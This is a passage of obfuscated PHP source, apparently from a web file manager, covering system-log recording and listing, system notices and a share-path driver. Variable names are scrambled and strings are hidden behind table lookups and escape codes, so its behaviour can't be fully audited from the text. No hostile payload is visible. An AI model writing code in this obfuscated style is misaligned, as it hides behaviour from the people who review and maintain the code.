$Çæëõ∫§[2396] => LNG($Çæëõ∫§[2397]), $Çæëõ∫§[2398] => LNG($Çæëõ∫§[2399]), $Çæëõ∫§[2400] => LNG($Çæëõ∫§[2401]), $Çæëõ∫§[1963] => LNG($Çæëõ∫§[2402]), $Çæëõ∫§[2403] => LNG($Çæëõ∫§[2404]), $Çæëõ∫§[1962] => LNG($Çæëõ∫§[2405]), $Çæëõ∫§[2406] => LNG($Çæëõ∫§[2407]), $Çæëõ∫§[2408] => LNG($Çæëõ∫§[2409]), $Çæëõ∫§[2410] => LNG($Çæëõ∫§[2409]), $Çæëõ∫§[2411] => LNG($Çæëõ∫§[2412]), $Çæëõ∫§[2413] => LNG($Çæëõ∫§[2413]), $Çæëõ∫§[2414] => LNG($Çæëõ∫§[1934]), $Çæëõ∫§[2415] => LNG($Çæëõ∫§[2416]), $Çæëõ∫§[2417] => LNG($Çæëõ∫§[2418]), $Çæëõ∫§[2419] => LNG($Çæëõ∫§[2420]), $Çæëõ∫§[2421] => LNG($Çæëõ∫§[2422]), $Çæëõ∫§[2423] => LNG($Çæëõ∫§[2424]), $Çæëõ∫§[2425] => LNG($Çæëõ∫§[2425]), $Çæëõ∫§[2426] => LNG($Çæëõ∫§[2427]), $Çæëõ∫§[2428] => LNG($Çæëõ∫§[2429]), $Çæëõ∫§[2430] => LNG($Çæëõ∫§[2431]), $Çæëõ∫§[2432] => LNG($Çæëõ∫§[2433]), $Çæëõ∫§[2434] => LNG($Çæëõ∫§[2435]), $Çæëõ∫§[2436] => LNG($Çæëõ∫§[2437]), $Çæëõ∫§[222] => LNG($Çæëõ∫§[222]), $Çæëõ∫§[223] => LNG($Çæëõ∫§[2438]), $Çæëõ∫§[2439] => LNG($Çæëõ∫§[2439])); } private function typeFile() { $∑¨⁄Ô±· =& $_SERVER[ˆë€Ï⁄∂]; $√∫µñßÆ = array($∑¨⁄Ô±·[1965] => array($∑¨⁄Ô±·[1966]), $∑¨⁄Ô±·[2378] => array($∑¨⁄Ô±·[2440]), $∑¨⁄Ô±·[2380] => array($∑¨⁄Ô±·[2441]), $∑¨⁄Ô±·[1958] => array($∑¨⁄Ô±·[1959], $∑¨⁄Ô±·[2442]), $∑¨⁄Ô±·[2388] => array(), $∑¨⁄Ô±·[2390] => array(), $∑¨⁄Ô±·[2392] => array(), $∑¨⁄Ô±·[1968] => array($∑¨⁄Ô±·[1970]), $∑¨⁄Ô±·[1969] => array($∑¨⁄Ô±·[1970]), $∑¨⁄Ô±·[2396] => array($∑¨⁄Ô±·[2443]), $∑¨⁄Ô±·[2398] => array($∑¨⁄Ô±·[2443]), $∑¨⁄Ô±·[2400] => array($∑¨⁄Ô±·[2444]), $∑¨⁄Ô±·[2386] => array($∑¨⁄Ô±·[2445]), $∑¨⁄Ô±·[1963] => array($∑¨⁄Ô±·[2446]), $∑¨⁄Ô±·[2403] => array($∑¨⁄Ô±·[2447]), $∑¨⁄Ô±·[1962] => array($∑¨⁄Ô±·[1964])); return $√∫µñßÆ; } private function typeAll() { $çå˜Ë∏Ä =& $_SERVER[ˆë€Ï⁄∂]; $õŸß¥≤á = $this->typeList; $˚ÅÇ˜ÆÀ = array_filter($this->typeFile()); foreach ($˚ÅÇ˜ÆÀ as $¿•Øó˛Ø => $±â«ëΩ¸) { $õŸß¥≤á[$±â«ëΩ¸[0]] = $õŸß¥≤á[$¿•Øó˛Ø]; } $õŸß¥≤á[$çå˜Ë∏Ä[1970]] = LNG($çå˜Ë∏Ä[2448]); $õŸß¥≤á[$çå˜Ë∏Ä[2443]] = LNG($çå˜Ë∏Ä[2449]); return $õŸß¥≤á; } public function addLog($„“◊Ì˝µ, $∏˙º¡Éí = array()) { $¡ùê∑º∂ =& $_SERVER[ˆë€Ï⁄∂]; if (!isset($this->typeList[$„“◊Ì˝µ])) { return; } $≈˜∂Òú◊ = Session::get($¡ùê∑º∂[2129]); if (!$≈˜∂Òú◊) { $≈˜∂Òú◊ = _get($∏˙º¡Éí, $¡ùê∑º∂[1787], 0); } if ($„“◊Ì˝µ == $¡ùê∑º∂[2415] && is_array($∏˙º¡Éí[$¡ùê∑º∂[2450]]) && !$∏˙º¡Éí[$¡ùê∑º∂[2450]]) { return; } $πû–≠¡Î = get_client_ip(); if (!$∏˙º¡Éí || strlen(json_encode($∏˙º¡Éí)) >= 1024 * 64) { if ($∏˙º¡Éí && is_array($∏˙º¡Éí)) { $∏˙º¡Éí = array_intersect_key($∏˙º¡Éí, array_flip($¡ùê∑º∂[486], $¡ùê∑º∂[32])); $∏˙º¡Éí[$¡ùê∑º∂[2451]] = $πû–≠¡Î; } else { $∏˙º¡Éí = array($¡ùê∑º∂[2451] => $πû–≠¡Î); } } else { if (is_array($∏˙º¡Éí)) { $∏˙º¡Éí[$¡ùê∑º∂[2451]] = $πû–≠¡Î; } else { $∏˙º¡Éí = array($¡ùê∑º∂[1302] => $∏˙º¡Éí, $¡ùê∑º∂[2451] => $πû–≠¡Î); } } $∏˙º¡Éí = array($¡ùê∑º∂[1777] => Session::sign(), $¡ùê∑º∂[1778] => intval($≈˜∂Òú◊), $¡ùê∑º∂[33] => $„“◊Ì˝µ, $¡ùê∑º∂[1780] => json_encode($∏˙º¡Éí)); return parent::add($∏˙º¡Éí); } public function remove($∑–éãúÖ) { $this->where(array($_SERVER[ˆë€Ï⁄∂][504] => $∑–éãúÖ))->delete(); } private function _makeOrder($Ïˆ˙ü…ƒ = '') { $π‚Üó˚ë =& $_SERVER[ˆë€Ï⁄∂]; $√à˚ê¶∂ = $π‚Üó˚ë[243]; $ö‰π·—Â = array($π‚Üó˚ë[534] => $π‚Üó˚ë[535], $π‚Üó˚ë[536] => $π‚Üó˚ë[537]); $ìæ≤≠é¨ = Input::get($π‚Üó˚ë[542], $π‚Üó˚ë[7], $π‚Üó˚ë[2169], array($π‚Üó˚ë[2083], $π‚Üó˚ë[536])); $ìæ≤≠é¨ = $ö‰π·—Â[$ìæ≤≠é¨]; $Ïˆ˙ü…ƒ = $Ïˆ˙ü…ƒ . "{$√à˚ê¶∂}\x20{$ìæ≤≠é¨}"; return $this->order($Ïˆ˙ü…ƒ); } public function get($Ÿˆ≥‹ì⁄ = '') { $„¥ÙÀπè =& $_SERVER[ˆë€Ï⁄∂]; if (!$Ÿˆ≥‹ì⁄) { show_json(array()); } $√•›®∆Ç = array(); if ($Ÿˆ≥‹ì⁄[$„¥ÙÀπè[1787]]) { $√•›®∆Ç[$„¥ÙÀπè[1787]] = $Ÿˆ≥‹ì⁄[$„¥ÙÀπè[1787]]; } if (isset($Ÿˆ≥‹ì⁄[$„¥ÙÀπè[851]])) { $á™Ä±é¯ = $Ÿˆ≥‹ì⁄[$„¥ÙÀπè[851]]; $˘í¬Ä≤± = isset($Ÿˆ≥‹ì⁄[$„¥ÙÀπè[852]]) ? $Ÿˆ≥‹ì⁄[$„¥ÙÀπè[852]] : time(); $√•›®∆Ç[$„¥ÙÀπè[243]] = array($„¥ÙÀπè[419], array($á™Ä±é¯, $˘í¬Ä≤±)); } if ($Ÿˆ≥‹ì⁄[$„¥ÙÀπè[33]]) { $›°Ë£Ãó = explode($„¥ÙÀπè[50], $Ÿˆ≥‹ì⁄[$„¥ÙÀπè[33]]); $Ç±ˆûÑ≠ = $this->typeFile(); $„ÀΩÛñÙ = array(); foreach ($›°Ë£Ãó as $®ù˝’Õô) { $„ÀΩÛñÙ[] = $®ù˝’Õô; if (isset($Ç±ˆûÑ≠[$®ù˝’Õô])) { $„ÀΩÛñÙ = array_merge($„ÀΩÛñÙ, $Ç±ˆûÑ≠[$®ù˝’Õô]); } } $„ÀΩÛñÙ = array_unique($„ÀΩÛñÙ); if ($„ÀΩÛñÙ) { $√•›®∆Ç[$„¥ÙÀπè[33]] = array($„¥ÙÀπè[7], $„ÀΩÛñÙ); } } else { $√•›®∆Ç[$„¥ÙÀπè[33]] = array($„¥ÙÀπè[2452], $„¥ÙÀπè[2453]); } if (!empty($Ÿˆ≥‹ì⁄[$„¥ÙÀπè[2451]])) { $√•›®∆Ç[$„¥ÙÀπè[537]] = array($„¥ÙÀπè[470], "\x25{$Ÿˆ≥‹ì⁄[$„¥ÙÀπè[2451]]}\45"); } $ÈË¸Ωœè = $this->_makeOrder()->where($√•›®∆Ç)->selectPage(); if (empty($ÈË¸Ωœè[$„¥ÙÀπè[456]])) { show_json(array(), !0, $ÈË¸Ωœè[$„¥ÙÀπè[453]]); } $ÈË¸Ωœè[$„¥ÙÀπè[456]] = $this->logList($ÈË¸Ωœè[$„¥ÙÀπè[456]]); return $ÈË¸Ωœè; } private function ipAddress(&$ÿÛ¿à ‚) { $÷Ã‹ŒŒâ =& $_SERVER[ˆë€Ï⁄∂]; if (!empty($ÿÛ¿à ‚[$÷Ã‹ŒŒâ[2451]])) { $ú√©ø±˛ = IpLocation::get($ÿÛ¿à ‚[$÷Ã‹ŒŒâ[2451]]); } else { $ú√©ø±˛ = LNG($÷Ã‹ŒŒâ[2454]); } $ÿÛ¿à ‚[$÷Ã‹ŒŒâ[2455]] = $ú√©ø±˛; } private function descZipDownload($ﬁÜ∑Û˝∏, &$Âﬂ·Ö”É) { $´ŒÜÄÜÃ =& $_SERVER[ˆë€Ï⁄∂]; if (!isset($ﬁÜ∑Û˝∏[$´ŒÜÄÜÃ[2456]])) { return; } $î¸ÿ∆¯≠ = json_decode($ﬁÜ∑Û˝∏[$´ŒÜÄÜÃ[2456]], !0); foreach ($î¸ÿ∆¯≠ as $´·∞ÊœÏ) { try { $…¨æ“’≈ = IO::infoFullSimple($´·∞ÊœÏ[$´ŒÜÄÜÃ[97]]); } catch (Exception $÷´òÍÓÚ) { continue; } $ﬁÜ∑Û˝∏[$´ŒÜÄÜÃ[97]] = $´·∞ÊœÏ[$´ŒÜÄÜÃ[97]]; $Âﬂ·Ö”É[] = $ﬁÜ∑Û˝∏[$´ŒÜÄÜÃ[203]] = $…¨æ“’≈[$´ŒÜÄÜÃ[203]]; $Âﬂ·Ö”É[] = $ﬁÜ∑Û˝∏[$´ŒÜÄÜÃ[2225]] = $…¨æ“’≈[$´ŒÜÄÜÃ[202]]; break; } return $ﬁÜ∑Û˝∏; } private function getSourceList(&$®Øº˚èõ) { $¬ıû∑ÔØ =& $_SERVER[ˆë€Ï⁄∂]; $ﬁñôÍëå = array(); foreach ($®Øº˚èõ as $ßŒ⁄ëûå => $˚˙˜Œ‡Í) { $Ô£»ÃÚÅ = json_decode($˚˙˜Œ‡Í[$¬ıû∑ÔØ[537]], !0); if ($˚˙˜Œ‡Í[$¬ıû∑ÔØ[33]] == $¬ıû∑ÔØ[1961]) { $Ô£»ÃÚÅ = $this->descZipDownload($Ô£»ÃÚÅ, $ﬁñôÍëå); $®Øº˚èõ[$ßŒ⁄ëûå][$¬ıû∑ÔØ[537]] = json_encode($Ô£»ÃÚÅ); continue; } if (strpos($˚˙˜Œ‡Í[$¬ıû∑ÔØ[33]], $¬ıû∑ÔØ[2227]) !== 0) { if (!isset($Ô£»ÃÚÅ[$¬ıû∑ÔØ[97]]) || strpos($˚˙˜Œ‡Í[$¬ıû∑ÔØ[33]], $¬ıû∑ÔØ[2457]) !== 0) { continue; } try { $±—›µÌÔ = IO::infoFullSimple($Ô£»ÃÚÅ[$¬ıû∑ÔØ[97]]); } catch (Exception $ ÃÌ¡¬Ù) { continue; } $ﬁñôÍëå[] = $Ô£»ÃÚÅ[$¬ıû∑ÔØ[203]] = $±—›µÌÔ[$¬ıû∑ÔØ[203]]; $ﬁñôÍëå[] = $Ô£»ÃÚÅ[$¬ıû∑ÔØ[2225]] = $±—›µÌÔ[$¬ıû∑ÔØ[202]]; $®Øº˚èõ[$ßŒ⁄ëûå][$¬ıû∑ÔØ[537]] = json_encode($Ô£»ÃÚÅ); continue; } $ﬁñôÍëå[] = $Ô£»ÃÚÅ[$¬ıû∑ÔØ[203]]; $ﬁñôÍëå[] = $Ô£»ÃÚÅ[$¬ıû∑ÔØ[2225]]; if ($Ô£»ÃÚÅ[$¬ıû∑ÔØ[33]] == $¬ıû∑ÔØ[634]) { $ﬁñôÍëå[] = $Ô£»ÃÚÅ[$¬ıû∑ÔØ[537]][$¬ıû∑ÔØ[1256]]; $ﬁñôÍëå[] = $Ô£»ÃÚÅ[$¬ıû∑ÔØ[537]][$¬ıû∑ÔØ[1257]]; } if ($Ô£»ÃÚÅ[$¬ıû∑ÔØ[33]] == $¬ıû∑ÔØ[2236]) { $ﬁñôÍëå[] = $Ô£»ÃÚÅ[$¬ıû∑ÔØ[537]][$¬ıû∑ÔØ[203]]; } } if (!$ﬁñôÍëå) { return array(); } return Model($¬ıû∑ÔØ[916])->sourceListInfo($ﬁñôÍëå, !0); } private function logList($üÁÇö—á) { $«¨•∂⁄Ã =& $_SERVER[ˆë€Ï⁄∂]; $“¬∂˙Òà = array_to_keyvalue($üÁÇö—á, $«¨•∂⁄Ã[12], $«¨•∂⁄Ã[1787]); $ò˚Éí˚ä = Model($«¨•∂⁄Ã[608])->userListInfo(array_unique($“¬∂˙Òà)); $∏§ùû’“ = $this->getSourceList($üÁÇö—á); $µ˚ÙÑ©ø = $this->typeAll(); $¥¿≠Á◊Í = array(); $‘Â›¶Ë‰ = array(); foreach ($üÁÇö—á as $¡øœ¡ıÁ => $µßÍ≠ÇÁ) { $≈Î°Òó√ = $µßÍ≠ÇÁ[$«¨•∂⁄Ã[33]]; $œ—øªËØ = isset($ò˚Éí˚ä[$µßÍ≠ÇÁ[$«¨•∂⁄Ã[1787]]]) ? $ò˚Éí˚ä[$µßÍ≠ÇÁ[$«¨•∂⁄Ã[1787]]] : !1; $»£¥¢—∑ = strpos($≈Î°Òó√, $«¨•∂⁄Ã[2458]) === 0 ? LNG($«¨•∂⁄Ã[2459]) : LNG($«¨•∂⁄Ã[2454]); $µßÍ≠ÇÁ[$«¨•∂⁄Ã[32]] = isset($œ—øªËØ[$«¨•∂⁄Ã[32]]) ? $œ—øªËØ[$«¨•∂⁄Ã[32]] : LNG($«¨•∂⁄Ã[2454]); $µßÍ≠ÇÁ[$«¨•∂⁄Ã[2286]] = isset($œ—øªËØ[$«¨•∂⁄Ã[2286]]) ? $œ—øªËØ[$«¨•∂⁄Ã[2286]] : $«¨•∂⁄Ã[12]; $µßÍ≠ÇÁ[$«¨•∂⁄Ã[1675]] = isset($µ˚ÙÑ©ø[$≈Î°Òó√]) ? $µ˚ÙÑ©ø[$≈Î°Òó√] : $»£¥¢—∑; $µßÍ≠ÇÁ[$«¨•∂⁄Ã[2168]] = $œ—øªËØ; $öÈ°àÂ¢ = json_decode($µßÍ≠ÇÁ[$«¨•∂⁄Ã[537]], !0); $µßÍ≠ÇÁ[$«¨•∂⁄Ã[2451]] = isset($öÈ°àÂ¢[$«¨•∂⁄Ã[2451]]) ? $öÈ°àÂ¢[$«¨•∂⁄Ã[2451]] : $«¨•∂⁄Ã[12]; $µßÍ≠ÇÁ[$«¨•∂⁄Ã[2455]] = IpLocation::get($µßÍ≠ÇÁ[$«¨•∂⁄Ã[2451]]); if (strpos($≈Î°Òó√, $«¨•∂⁄Ã[2227]) === 0 || isset($öÈ°àÂ¢[$«¨•∂⁄Ã[2225]])) { $öÈ°àÂ¢[$«¨•∂⁄Ã[100]] = $∏§ùû’“[$öÈ°àÂ¢[$«¨•∂⁄Ã[203]]]; $öÈ°àÂ¢[$«¨•∂⁄Ã[2241]] = $∏§ùû’“[$öÈ°àÂ¢[$«¨•∂⁄Ã[2225]]]; if ($öÈ°àÂ¢[$«¨•∂⁄Ã[33]] == $«¨•∂⁄Ã[634]) { $öÈ°àÂ¢[$«¨•∂⁄Ã[537]][$«¨•∂⁄Ã[1256]] = $∏§ùû’“[$öÈ°àÂ¢[$«¨•∂⁄Ã[537]][$«¨•∂⁄Ã[1256]]]; $öÈ°àÂ¢[$«¨•∂⁄Ã[537]][$«¨•∂⁄Ã[1257]] = $∏§ùû’“[$öÈ°àÂ¢[$«¨•∂⁄Ã[537]][$«¨•∂⁄Ã[1257]]]; } if ($öÈ°àÂ¢[$«¨•∂⁄Ã[33]] == $«¨•∂⁄Ã[2236]) { $öÈ°àÂ¢[$«¨•∂⁄Ã[537]][$«¨•∂⁄Ã[203]] = $∏§ùû’“[$öÈ°àÂ¢[$«¨•∂⁄Ã[537]][$«¨•∂⁄Ã[203]]]; } if ($öÈ°àÂ¢[$«¨•∂⁄Ã[33]] == $«¨•∂⁄Ã[1956]) { $öÈ°àÂ¢[$«¨•∂⁄Ã[2241]] = $öÈ°àÂ¢[$«¨•∂⁄Ã[100]]; $öÈ°àÂ¢[$«¨•∂⁄Ã[2225]] = $öÈ°àÂ¢[$«¨•∂⁄Ã[2241]][$«¨•∂⁄Ã[203]]; $öÈ°àÂ¢[$«¨•∂⁄Ã[100]] = !1; $öÈ°àÂ¢[$«¨•∂⁄Ã[203]] = $«¨•∂⁄Ã[12]; } $ûÒáÿŒè = array($«¨•∂⁄Ã[1956], $«¨•∂⁄Ã[2223]); if (!in_array($öÈ°àÂ¢[$«¨•∂⁄Ã[33]], $ûÒáÿŒè)) { if ($öÈ°àÂ¢[$«¨•∂⁄Ã[100]] && $öÈ°àÂ¢[$«¨•∂⁄Ã[100]][$«¨•∂⁄Ã[200]] == $«¨•∂⁄Ã[201]) { $‘Â›¶Ë‰[] = $µßÍ≠ÇÁ[$«¨•∂⁄Ã[486]]; unset($üÁÇö—á[$¡øœ¡ıÁ]); continue; } if ($öÈ°àÂ¢[$«¨•∂⁄Ã[2241]] && $öÈ°àÂ¢[$«¨•∂⁄Ã[2241]][$«¨•∂⁄Ã[200]] == $«¨•∂⁄Ã[201]) { $‘Â›¶Ë‰[] = $µßÍ≠ÇÁ[$«¨•∂⁄Ã[486]]; unset($üÁÇö—á[$¡øœ¡ıÁ]); continue; } } } $µßÍ≠ÇÁ[$«¨•∂⁄Ã[537]] = $öÈ°àÂ¢; unset($µßÍ≠ÇÁ[$«¨•∂⁄Ã[2460]]); $¥¿≠Á◊Í[] = $µßÍ≠ÇÁ; } $this->clearSystemPathLog($‘Â›¶Ë‰); return $¥¿≠Á◊Í; } private function clearSystemPathLog($Ó˜Á˚î¬) { $Ì÷Ã”‰¨ =& $_SERVER[ˆë€Ï⁄∂]; if (count($Ó˜Á˚î¬) == 0) { return; } $˝¿òÒªô = array($Ì÷Ã”‰¨[486] => array($Ì÷Ã”‰¨[7], array_unique($Ó˜Á˚î¬))); $this->where($˝¿òÒªô)->delete(); } public function deviceList($ôŒ¬ﬁë≥, $ïÎäìõÿ = 0) { $Ùë‘É„¸ =& $_SERVER[ˆë€Ï⁄∂]; $ô…´˜ä∞ = array($Ùë‘É„¸[1787] => $ôŒ¬ﬁë≥, $Ùë‘É„¸[243] => array($Ùë‘É„¸[1106], $ïÎäìõÿ), $Ùë‘É„¸[33] => $Ùë‘É„¸[1930]); $å∞Úƒ’∫ = array(); $Åï◊œµÍ = $this->field($Ùë‘É„¸[2461])->where($ô…´˜ä∞)->order($Ùë‘É„¸[2239])->limit(50)->select(); foreach ($Åï◊œµÍ as $‚ß€ôê => $ƒœÍíó£) { if ($‚ß€ôê > 0 && abs($ƒœÍíó£[$Ùë‘É„¸[243]] - $Åï◊œµÍ[$‚ß€ôê - 1][$Ùë‘É„¸[243]]) < 5) { continue; } $¬≥ë´âÚ = json_decode($ƒœÍíó£[$Ùë‘É„¸[537]], !0); $ƒœÍíó£[$Ùë‘É„¸[2451]] = isset($¬≥ë´âÚ[$Ùë‘É„¸[2451]]) ? $¬≥ë´âÚ[$Ùë‘É„¸[2451]] : $Ùë‘É„¸[12]; unset($¬≥ë´âÚ[$Ùë‘É„¸[2451]]); $§¸ñ‡ ñ = $this->deviceType($¬≥ë´âÚ[$Ùë‘É„¸[2228]]); if (isset($å∞Úƒ’∫[$§¸ñ‡ ñ])) { continue; } $ƒœÍíó£[$Ùë‘É„¸[2455]] = IpLocation::get($ƒœÍíó£[$Ùë‘É„¸[2451]]); $ƒœÍíó£[$Ùë‘É„¸[537]] = $¬≥ë´âÚ; $å∞Úƒ’∫[$§¸ñ‡ ñ] = $ƒœÍíó£; } return array_values($å∞Úƒ’∫); } public function deviceType($ÜÔÜã‹ﬁ) { return $ÜÔÜã‹ﬁ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\x2e\x6e\x6f\x74\x69\x63\x65\114\151\x73\164"; public $field = array("\156\x61\x6d\145", "\143\x6f\156\x74\145\156\x74", "\x61\x75\164\x68", "\x6d\x6f\144\x65", "\x74\x69\x6d\x65", "\x74\171\x70\x65", "\154\x65\166\145\154", "\145\156\141\x62\154\145", "\x73\x6f\x72\x74"); public function listData($–›˙áÚ· = false, $†ãö…”⁄ = "\163\157\162\x74", $–é≥˜–ó = false) { return parent::listData($–›˙áÚ·, $†ãö…”⁄, $–é≥˜–ó); } public function add($èù®≠¶À) { $´Ë˛ò≈≥ =& $_SERVER[ˆë€Ï⁄∂]; $„ÆäÂ€≠ = time(); if ($èù®≠¶À[$´Ë˛ò≈≥[16]] == $´Ë˛ò≈≥[2462]) { $„ÆäÂ€≠ = strtotime($èù®≠¶À[$´Ë˛ò≈≥[216]]); } $èù®≠¶À[$´Ë˛ò≈≥[216]] = $„ÆäÂ€≠; return parent::insert($èù®≠¶À); } public function update($ùí·Ù∏˛, $™’ƒÂÛë) { $á¶ºú°∆ =& $_SERVER[ˆë€Ï⁄∂]; $–€å÷’ç = $this->listData($ùí·Ù∏˛); if (!$–€å÷’ç) { return !1; } $ŒÊ‰ˆ©Á = time(); if ($™’ƒÂÛë[$á¶ºú°∆[16]] == $á¶ºú°∆[2462]) { $ŒÊ‰ˆ©Á = strtotime($™’ƒÂÛë[$á¶ºú°∆[216]]); } $™’ƒÂÛë[$á¶ºú°∆[216]] = $ŒÊ‰ˆ©Á; return parent::update($ùí·Ù∏˛, $™’ƒÂÛë); } public function remove($çêéí°ã) { $ª∞ø°óÄ = $this->listData($çêéí°ã); if (!$ª∞ø°óÄ || $ª∞ø°óÄ[$_SERVER[ˆë€Ï⁄∂][201]]) { return !1; } return parent::remove($çêéí°ã); } public function sort($∑≥å©¶“, $ûŸˆ©˜∑) { return parent::update($∑≥å©¶“, $ûŸˆ©˜∑); } public function enable($Ó÷ë∂âÛ, $¡¢¡ﬁá¶) { return parent::update($Ó÷ë∂âÛ, array($_SERVER[ˆë€Ï⁄∂][2463] => $¡¢¡ﬁá¶)); } private function initUserOption() { $¡è∑øÕ˙ =& $_SERVER[ˆë€Ï⁄∂]; $this->optionType = $¡è∑øÕ˙[2464]; $this->modelType = $¡è∑øÕ˙[2465]; $this->field = array($¡è∑øÕ˙[2466], $¡è∑øÕ˙[32], $¡è∑øÕ˙[216], $¡è∑øÕ˙[33], $¡è∑øÕ˙[2467], $¡è∑øÕ˙[841], $¡è∑øÕ˙[238]); } public function userNoticeGet($∆˛⁄òùú = false) { $this->initUserOption(); return parent::listData($∆˛⁄òùú, $_SERVER[ˆë€Ï⁄∂][486], !0); } public function userNoticeAdd($°ªÀ†‹∂) { $öÃ≈ç√ï =& $_SERVER[ˆë€Ï⁄∂]; $this->initUserOption(); $Èèú‹´∞ = $this->findByKey($öÃ≈ç√ï[2466], $°ªÀ†‹∂[$öÃ≈ç√ï[486]]); if ($Èèú‹´∞) { return !0; } $√¡ß£∑Ñ = array($öÃ≈ç√ï[2466] => $°ªÀ†‹∂[$öÃ≈ç√ï[486]], $öÃ≈ç√ï[32] => $°ªÀ†‹∂[$öÃ≈ç√ï[32]], $öÃ≈ç√ï[216] => $°ªÀ†‹∂[$öÃ≈ç√ï[216]], $öÃ≈ç√ï[33] => isset($°ªÀ†‹∂[$öÃ≈ç√ï[33]]) ? $°ªÀ†‹∂[$öÃ≈ç√ï[33]] : 1, $öÃ≈ç√ï[2467] => isset($°ªÀ†‹∂[$öÃ≈ç√ï[2467]]) ? $°ªÀ†‹∂[$öÃ≈ç√ï[2467]] : 0, $öÃ≈ç√ï[841] => 0, $öÃ≈ç√ï[238] => 0); return parent::insert($√¡ß£∑Ñ); } public function userNoticeEdit($¯ï¡˝Íâ, $Öááö˛í) { $this->initUserOption(); return parent::update($¯ï¡˝Íâ, $Öááö˛í); } } goto cóÏËê‰„∫; E·®Ó°‰ßˆ: class PathDriverDriverShareItem { public function __construct($ﬂÄãÍÍù) { $this->pathParse = $ﬂÄãÍÍù; } public function __call($‡ò¿€Ëﬂ, $ùΩÖ™ä∂) { $ë˛Õé•¥ =& $_SERVER[ˆë€Ï⁄∂]; if (method_exists($this, $‡ò¿€Ëﬂ)) { return; } $•†‰ìÌá = call_user_func_array(array($ë˛Õé•¥[1445], $‡ò¿€Ëﬂ), $ùΩÖ™ä∂); $ê«€Áù‹ = array($ë˛Õé•¥[1446], $ë˛Õé•¥[1447], $ë˛Õé•¥[1448], $ë˛Õé•¥[1449], $ë˛Õé•¥[632], $ë˛Õé•¥[634], $ë˛Õé•¥[1450], $ë˛Õé•¥[120], $ë˛Õé•¥[1451], $ë˛Õé•¥[1452]); if (in_array($‡ò¿€Ëﬂ, $ê«€Áù‹)) { $•†‰ìÌá = $this->getPathOuter($•†‰ìÌá); } return $•†‰ìÌá; } public function copy($∏ç¿Í…Â, $≠Ôè›ßœ, $’ìË»‚å = false, $–€¡‚ô© = false) { return $this->copyMove($∏ç¿Í…Â, $≠Ôè›ßœ, $’ìË»‚å, $_SERVER[ˆë€Ï⁄∂][632], $–€¡‚ô©); } public function move($ŒΩ•∞≈’, $Ë∑·Ãîß, $±Ûπ‘˛à = false, $Ê¡÷˘´µ = false) { return $this->copyMove($ŒΩ•∞≈’, $Ë∑·Ãîß, $±Ûπ‘˛à, $_SERVER[ˆë€Ï⁄∂][634], $Ê¡÷˘´µ); } private function copyMove($‘üë∑œ◊, $„Ó•Îø, $ã∑∫“”Ü, $äê„Æñπ, $ì…„É÷≤ = false) { $îµ√À¬ª =& $_SERVER[ˆë€Ï⁄∂]; $ÌÈùâä = $„Ó•Îø; $¨œÜ»˝√ = IO::driverMake($„Ó•Îø); if ($¨œÜ»˝√->pathParse[$îµ√À¬ª[1247]]) { $„Ó•Îø = $¨œÜ»˝√->pathParse[$îµ√À¬ª[1247]]; } else { $„Ó•Îø = $ÌÈùâä; } $Ωª˘†ä’ = IO::copyMove($‘üë∑œ◊, $„Ó•Îø, $ã∑∫“”Ü, $äê„Æñπ, $ì…„É÷≤); $Ωª˘†ä’ = $this->getPathOuter($Ωª˘†ä’); return $Ωª˘†ä’; } public function pathThis($ØèøÃ∫û) { return get_path_this($this->pathParse[$_SERVER[ˆë€Ï⁄∂][97]]); } public function pathFather($Ï—êô≥í) { return get_path_father($this->pathParse[$_SERVER[ˆë€Ï⁄∂][97]]); } public function iconvSystem($“œÖ—íÃ) { return $“œÖ—íÃ; } protected function infoParse($ÏÚ›»»é, $ÛÄ »§Ò = false) { $Â∑⁄ûîﬁ =& $_SERVER[ˆë€Ï⁄∂]; $¬∑•¿∂û = $this->pathParse[$Â∑⁄ûîﬁ[571]][$Â∑⁄ûîﬁ[1272]] . $this->pathParse[$Â∑⁄ûîﬁ[1265]]; if ($ÛÄ »§Ò) { $¸¡˝Âı˛ = IO::infoWithChildren($¬∑•¿∂û); } else { $¸¡˝Âı˛ = IO::info($¬∑•¿∂û); } $û¢ôÍ¶é = $this->pathParse[$Â∑⁄ûîﬁ[571]]; return Action($Â∑⁄ûîﬁ[1443])->_shareItemeParse($¸¡˝Âı˛, $û¢ôÍ¶é); } public function listAll($ãñÉﬁ°…) { $ÎÇ¸©‡Ä =& $_SERVER[ˆë€Ï⁄∂]; $Ç¢ƒË∆⁄ = IO::listAll($ãñÉﬁ°…); $öÃ¯ËÚ» = rtrim($this->pathParse[$ÎÇ¸©‡Ä[571]][$ÎÇ¸©‡Ä[1272]], $ÎÇ¸©‡Ä[8]); foreach ($Ç¢ƒË∆⁄ as &$Œû»∂âÉ) { $Œû»∂âÉ[$ÎÇ¸©‡Ä[97]] = $this->pathDriver . $ÎÇ¸©‡Ä[8] . ltrim(substr($Œû»∂âÉ[$ÎÇ¸©‡Ä[97]], strlen($öÃ¯ËÚ»)), $ÎÇ¸©‡Ä[8]); } unset($Œû»∂âÉ); return $Ç¢ƒË∆⁄; } public function listAllSimple($¯Ë¯áá£, $¥ØàÂÀÒ = false) { $ùá≤«£€ =& $_SERVER[ˆë€Ï⁄∂]; $≈·à÷ÅÍ = $this->listAll($¯Ë¯áá£); $ËƒÙ¸¿Ã = $this->pathParse[$ùá≤«£€[506]]; if (trim($ËƒÙ¸¿Ã, $ùá≤«£€[8]) == trim(get_path_father($ËƒÙ¸¿Ã), $ùá≤«£€[8])) { $¥ØàÂÀÒ = !0; } return IO::init($ùá≤«£€[12])->listAllSimpleMake($≈·à÷ÅÍ, $ËƒÙ¸¿Ã, $¥ØàÂÀÒ); } public function getPathOuter($Î⁄îÀÏ”) { $˝ÎıÇñ =& $_SERVER[ˆë€Ï⁄∂]; $’ÜËˆÇ = KodIO::parse($Î⁄îÀÏ”); if ($’ÜËˆÇ[$˝ÎıÇñ[33]] == KodIO::KOD_SHARE_ITEM) { return $’ÜËˆÇ[$˝ÎıÇñ[97]]; } $◊Ü¯¥∏å = KodIO::clear($Î⁄îÀÏ”); $öè¡ﬂ·˘ = KodIO::clear($this->pathParse[$˝ÎıÇñ[571]][$˝ÎıÇñ[1272]]); $ä◊õ€¬› = substr($◊Ü¯¥∏å, strlen($öè¡ﬂ·˘)); if (substr($◊Ü¯¥∏å, 0, strlen($öè¡ﬂ·˘)) != $öè¡ﬂ·˘) { return !1; } return $this->pathParse[$˝ÎıÇñ[1266]] . $˝ÎıÇñ[8] . ltrim($ä◊õ€¬›, $˝ÎıÇñ[8]); } public function getType() { $°ÛçûÒò =& 